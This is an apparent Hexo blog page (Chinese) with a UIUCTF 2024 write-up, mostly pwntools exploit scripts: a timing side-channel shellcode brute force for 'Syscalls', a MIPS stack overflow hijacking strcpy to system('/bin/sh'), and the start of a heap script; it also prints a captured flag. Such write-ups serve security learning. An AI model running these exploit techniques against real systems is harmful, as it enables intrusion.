@@ -1,0 +1,733 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pw">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="uiuctfSyscalls侧信道爆破，注意flag文件的名字 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024uiuctf">
+<meta property="og:url" content="http://example.com/2024/07/01/uiuctf/index.html">
+<meta property="og:site_name" content="pw">
+<meta property="og:description" content="uiuctfSyscalls侧信道爆破，注意flag文件的名字 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/07/01/uiuctf/1.png">
+<meta property="og:image" content="http://example.com/2024/07/01/uiuctf/2.png">
+<meta property="og:image" content="http://example.com/2024/07/01/uiuctf/3.png">
+<meta property="og:image" content="http://example.com/2024/07/01/uiuctf/4.png">
+<meta property="article:published_time" content="2024-07-01T10:52:03.000Z">
+<meta property="article:modified_time" content="2024-07-02T02:38:29.405Z">
+<meta property="article:author" content="pw">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/07/01/uiuctf/1.png">
+  
+  
+  
+  <title>2024uiuctf - pw</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"y2JhJN2Q6Bvhk7i3zBmRYZkn-gzGzoHsz","app_key":"NSFQG1YUdY6huW8XwmlgXGLG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pw</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024uiuctf"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-01 18:52" pubdate>
+          2024年7月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024uiuctf</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="uiuctf"><a href="#uiuctf" class="headerlink" title="uiuctf"></a><center>uiuctf</h1><h2 id="Syscalls"><a href="#Syscalls" class="headerlink" title="Syscalls"></a>Syscalls</h2><p>侧信道爆破，注意flag文件的名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br>context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>#context.arch = &#x27;amd64&#x27;<br>file = &#x27;./syscalls&#x27;<br>elf = ELF(file)<br>#libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>debug = 3<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br><br>#----------------------------------------------------------------------<br># dbg(&#x27;b *$rebase(0x012D6)&#x27;)<br># pw = remote(&quot;syscalls.chal.uiuc.tf&quot;, 1337, ssl=True)<br>ss = &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#125;&#123;-&quot;<br>l = [ord(x) for x in ss]<br>flag = &quot;&quot;<br><br>index = 0<br>shellcode = asm(shellcraft.openat(-100, &#x27;flag.txt&#x27;))<br>shellcode += asm(shellcraft.mmap(0,0x50,7,2,3,0))<br>cmp_ = &#x27;&#x27;&#x27;<br>    mov dl, byte ptr [rax+&#123;&#125;]<br>    mov cl, &#123;&#125;<br>    cmp cl,dl<br>    je loop<br>    mov rax,60<br>    syscall<br>    loop:<br>        jmp loop<br>&#x27;&#x27;&#x27;<br># ru(&#x27;flag.txt&#x27;)<br># ru(&#x27;can give you.\n&#x27;) <br># sl(shellcode+asm(cmp_.format(1,ord(&#x27;i&#x27;))))<br><br>flag = &quot;&quot;<br>index = 0<br>k = 0<br>print(l[0])<br>for x in range(0x50):<br>    sleep(1)<br><br>    if l[k] == 125:<br>        break<br><br>    for i in range(len(ss)): <br>        # pw = process(&#x27;./syscalls&#x27;)<br>        pw = remote(&quot;syscalls.chal.uiuc.tf&quot;, 1337, ssl=True)<br>        ru(b&#x27;you.\n&#x27;)  <br>        sl(shellcode+asm(cmp_.format(index,l[i])))<br>        try:<br>            print(&#x27;len :&#x27;,index,chr(l[i]))  <br>            pw.recv(timeout=2)<br>            flag += chr(l[i])<br>            print(&#x27;yes :&#x27;,l[i])<br>            index += 1<br>            k = i<br>            pw.close()<br>        except:<br>            print(&#x27;no&#x27;)<br>            pw.close()<br><br>print(flag)<br><br><br># sleep(0.2)<br># sl(b&#x27;a&#x27;*10)<br><br>pwpw()<br><br><br>#uiuctf&#123;a53HaIf9aald1fa5906de364a1162e0833cS7a0246ax9ffc&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Backup-Power"><a href="#Backup-Power" class="headerlink" title="Backup Power"></a>Backup Power</h2><p>​	存在栈溢出</p>
+<img src="/2024/07/01/uiuctf/1.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	溢出时发现，strcpy函数时通过一个地址的偏移来给的</p>
+<img src="/2024/07/01/uiuctf/2.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	system距离strcpy的距离是0x8，这里的gp也是可控的，之间就劫持为system了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;mips&#x27;  <br><br>pwn_arch =&#x27;mips&#x27; #riscv riscv32 <br>link_dir = &quot;/usr/mipsel-linux-gnu&quot;<br>pwnfile = &#x27;./backup-power&#x27;<br>port= &quot;8888&quot; <br>context.binary = pwnfile<br>debug = 1<br>if debug == 1 :<br>    pw = process([&quot;qemu-&quot; + pwn_arch , &quot;-g&quot;,port, pwnfile])<br>elif debug == 0:<br>    pw = process([&quot;qemu-&quot; + pwn_arch , pwnfile])<br>elif debug == 2: <br>    pw = remote(&#x27;backup-power.chal.uiuc.tf&#x27;,1337,ssl=True)<br>else:<br>    exit(0)<br><br>if debug == 1:<br>    attach_payload =&quot;&quot;&quot;<br>        gdb-multiarch  \<br>        -ex &quot;file &#123;0&#125;&quot; \<br>        -ex &quot;target remote :&#123;1&#125;&quot; \<br>        -ex &quot;set  architecture &#123;2&#125;&quot; \<br>        &quot;&quot;&quot;.format(pwnfile , port , pwn_arch)  <br>    pwnlib.util.misc.run_in_new_terminal(attach_payload)<br><br>#----------------------------------------------------------------------<br># dbg(&#x27;b *0x400a50 x&#x27;)<br>sl(b&#x27;devolper&#x27;)<br><br>sl(b&#x27;a&#x27;*44 + p32(0x400b0c) + b&#x27;a&#x27; * 24 + p32(0x4aa330+8) + b&#x27;a&#x27;*220 + b&#x27;/bin/sh\x00&#x27; + cyclic(248) + p32(0x746f646f))<br># 0x4aa330<br># sl(b&#x27;a&#x27;*0x10)<br><br><br>pwpw()<br></code></pre></td></tr></table></figure>
+
+<h2 id="Rusty-Pointers"><a href="#Rusty-Pointers" class="headerlink" title="Rusty Pointers"></a>Rusty Pointers</h2><p>rust看不懂，盲打的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs undefined">from pwn import *<br>from struct import *<br>from ctypes import *<br>from LibcSearcher import *<br>from functools import reduce<br>from z3 import *<br>import gmpy2<br>#import ctf_pb2<br><br>c = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br># srop :    frame = SigreturnFrame()<br># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)<br><br>s    =    lambda a              :pw.send(a)<br>sl   =    lambda a              :pw.sendline(a)<br>sa   =    lambda a,b            :pw.sendafter(a,b)<br>sla  =    lambda a,b            :pw.sendlineafter(a,b)<br>r    =    lambda a=6666         :pw.recv(a)<br>rl   =    lambda                :pw.recvline()<br>ru   =    lambda a,b=True       :pw.recvuntil(a,b)<br>g64  =    lambda                :u64(pw.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>g32  =    lambda                :u32(pw.recvuntil(b&#x27;\xf7&#x27;).ljust(4,b&#x27;\x00&#x27;))<br>gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b&#x27;\x00&#x27;))<br>gc   =    lambda a              :u64(pw.recv(7).rjust(8,b&#x27;\x00&#x27;))<br>pwpw =    lambda                :pw.interactive()<br>lss  =    lambda s :log.success(&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27; % (s, eval(s)))<br>cal  =    lambda a,b            :((a - b) + 0x10000) % 0x10000<br><br>def sb(libc_base):<br>    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br><br>def orw(libc_base):<br>    return libc_base + libc.sym[&#x27;open&#x27;], libc_base + libc.sym[&#x27;read&#x27;], libc_base + libc.sym[&#x27;write&#x27;]<br><br>def search():<br>    libc = LibcSearcher(&quot;puts&quot;, puts)<br>    libc_base = puts - libc.dump(&quot;puts&quot;)<br>    system = libc.dump(&quot;system&quot;) + libc_base<br>    binsh = libc.dump(&quot;str_bin_sh&quot;) + libc_base<br>    return system,binsh<br><br>def dbg(a=&#x27;&#x27;):<br>    if a !=&#x27;&#x27;:<br>        gdb.attach(pw,a) <br>        pause()<br>    else:<br>        gdb.attach(pw)  <br>        pause()<br>  <br># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br># context.arch=&#x27;i386&#x27;<br>context.terminal=[&quot;tmux&quot; ,&quot;split&quot; ,&quot;-h&quot;]<br>context.arch = &#x27;amd64&#x27;<br>file = &#x27;./rusty_ptrs&#x27;<br>elf = ELF(file)<br>libc = ELF(&#x27;/home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;)  <br># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>debug = 2<br>if debug == 0:<br>    pw = process(file)<br>if debug == 1:<br>    pw = remote(&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;, 9999, ssl=True)<br>if debug == 2:<br>    gdbscript = &#x27;&#x27;&#x27;<br>        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/<br>        continue<br>    &#x27;&#x27;&#x27;<br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br>#----------------------------------------------------------------------<br>def add(a):<br>    sla(b&#x27;&gt;&#x27;,str(1))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>def free(a,idx):<br>    sla(b&#x27;&gt;&#x27;,str(2))<br>    sla(b&#x27;&gt;&#x27;,str(a))<br>    sla(b&#x27;&gt;&#x27;,str(idx))<br>def show(a,idx):<br>    